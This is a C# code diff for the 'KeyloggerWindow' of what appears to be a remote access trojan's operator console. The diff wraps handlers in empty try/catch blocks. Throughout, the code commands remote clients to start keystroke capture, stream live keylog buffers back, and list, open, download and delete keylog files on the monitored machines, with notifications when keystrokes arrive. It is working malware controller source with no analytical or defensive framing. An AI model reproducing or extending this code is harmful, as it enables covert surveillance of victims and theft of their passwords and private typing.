@@ -45,13 +45,17 @@ public partial class KeyloggerWindow : ThemedWindow
         // Auto-start capturing on open + immediately fetch live buffer + file list
         Loaded += async (_, _) =>
         {
-            await Task.Delay(Random.Shared.Next(0, 250));
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
-            _capturing = true; UpdateBadge(); _autoRefresh.Start();
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
-            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
-            ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
-            ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
+            try
+            {
+                await Task.Delay(Random.Shared.Next(0, 250));
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
+                _capturing = true; UpdateBadge(); _autoRefresh.Start();
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
+                await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+                ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
+                ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
+            }
+            catch { }
         };
     }
 
@@ -74,69 +78,85 @@ public partial class KeyloggerWindow : ThemedWindow
 
     private async void RequestLogs()
     {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
+        try { await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs }); } catch { }
     }
 
     private async void RequestFileList()
     {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
-        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
+        try
+        {
+            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
+            TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
+        }
+        catch { }
     }
 
     // ── Incoming ────────────────────────────────────────────────────────────
 
     private void OnLogsResult(Packet pkt)
     {
-        var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
-        if (data == null) return;
-        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
-        Dispatcher.BeginInvoke(() =>
+        try
         {
-            _capturing = data.IsRunning;
-            UpdateBadge();
-            if (!string.IsNullOrEmpty(data.Logs))
+            var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
             {
-                NotificationService.NotifyKeylogReceived();
-                TxtLog.AppendText(data.Logs);
-                if (TxtLog.Text.Length > 50000)
-                    TxtLog.Text = TxtLog.Text[^50000..];
-                TxtLog.ScrollToEnd();
-                TxtViewerTitle.Text = $"Live buffer — {(_capturing ? "ON" : "OFF")}";
-            }
-            TxtStatus.Text = _capturing ? Lang.Get("KL_CAPTURING") : Lang.Get("STOPPED");
-        });
+                _capturing = data.IsRunning;
+                UpdateBadge();
+                if (!string.IsNullOrEmpty(data.Logs))
+                {
+                    NotificationService.NotifyKeylogReceived();
+                    TxtLog.AppendText(data.Logs);
+                    if (TxtLog.Text.Length > 50000)
+                        TxtLog.Text = TxtLog.Text[^50000..];
+                    TxtLog.ScrollToEnd();
+                    TxtViewerTitle.Text = $"Live buffer — {(_capturing ? "ON" : "OFF")}";
+                }
+                TxtStatus.Text = _capturing ? Lang.Get("KL_CAPTURING") : Lang.Get("STOPPED");
+            });
+        }
+        catch { }
     }
 
     private void OnFilesResult(Packet pkt)
     {
-        var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
-        if (data == null) return;
-        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
-        Dispatcher.BeginInvoke(() =>
+        try
         {
-            _capturing = data.IsRunning;
-            UpdateBadge();
+            var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                _capturing = data.IsRunning;
+                UpdateBadge();
 
-            ListFiles.Items.Clear();
-            foreach (var f in data.Files)
-                ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));
+                ListFiles.Items.Clear();
+                foreach (var f in data.Files)
+                    ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));
 
-            TxtStatus.Text = string.Format(Lang.Get("KL_STATUS"), data.Files.Count, _capturing ? Lang.Get("KL_YES") : Lang.Get("KL_NO"));
-        });
+                TxtStatus.Text = string.Format(Lang.Get("KL_STATUS"), data.Files.Count, _capturing ? Lang.Get("KL_YES") : Lang.Get("KL_NO"));
+            });
+        }
+        catch { }
     }
 
     private void OnFileContent(Packet pkt)
     {
-        var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
-        if (data == null) return;
-        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
-        Dispatcher.BeginInvoke(() =>
+        try
         {
-            TxtLog.Text = data.Content;
-            TxtViewerTitle.Text = data.Filename;
-            TxtLog.ScrollToEnd();
-            TxtStatus.Text = string.Format(Lang.Get("KL_LOADED"), data.Filename, data.Content.Length.ToString("N0"));
-        });
+            var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
+            if (data == null) return;
+            if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
+            Dispatcher.BeginInvoke(() =>
+            {
+                TxtLog.Text = data.Content;
+                TxtViewerTitle.Text = data.Filename;
+                TxtLog.ScrollToEnd();
+                TxtStatus.Text = string.Format(Lang.Get("KL_LOADED"), data.Filename, data.Content.Length.ToString("N0"));
+            });
+        }
+        catch { }
     }
 
     // ── Button handlers ──────────────────────────────────────────────────────
@@ -152,33 +172,41 @@ public partial class KeyloggerWindow : ThemedWindow
 
     private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
     {
-        if (ListFiles.SelectedItem is not LogFileVM vm) return;
-        _currentFilename = vm.Filename;
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.KeyloggerGetFile,
-            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
-        });
-        TxtStatus.Text = string.Format(Lang.Get("KL_LOADING"), vm.Filename);
+            if (ListFiles.SelectedItem is not LogFileVM vm) return;
+            _currentFilename = vm.Filename;
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerGetFile,
+                Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
+            });
+            TxtStatus.Text = string.Format(Lang.Get("KL_LOADING"), vm.Filename);
+        }
+        catch { }
     }
 
     private async void BtnDelete_Click(object s, RoutedEventArgs e)
     {
-        if (ListFiles.SelectedItem is not LogFileVM vm) return;
-        if (MessageBox.Show(string.Format(Lang.Get("KL_DELETE_CONFIRM"), vm.Filename), Lang.Get("MSG_CONFIRM"),
-            MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
-
-        await _server.SendToClient(_clientId, new Packet
+        try
         {
-            Type = PacketType.KeyloggerDeleteFile,
-            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
-        });
-        ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
-        ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
-        await Task.Delay(400);
-        RequestFileList();
-        TxtLog.Clear();
-        TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
+            if (ListFiles.SelectedItem is not LogFileVM vm) return;
+            if (MessageBox.Show(string.Format(Lang.Get("KL_DELETE_CONFIRM"), vm.Filename), Lang.Get("MSG_CONFIRM"),
+                MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.KeyloggerDeleteFile,
+                Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
+            });
+            ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
+            ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
+            await Task.Delay(400);
+            RequestFileList();
+            TxtLog.Clear();
+            TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
+        }
+        catch { }
     }
 
     private void BtnDownload_Click(object s, RoutedEventArgs e)
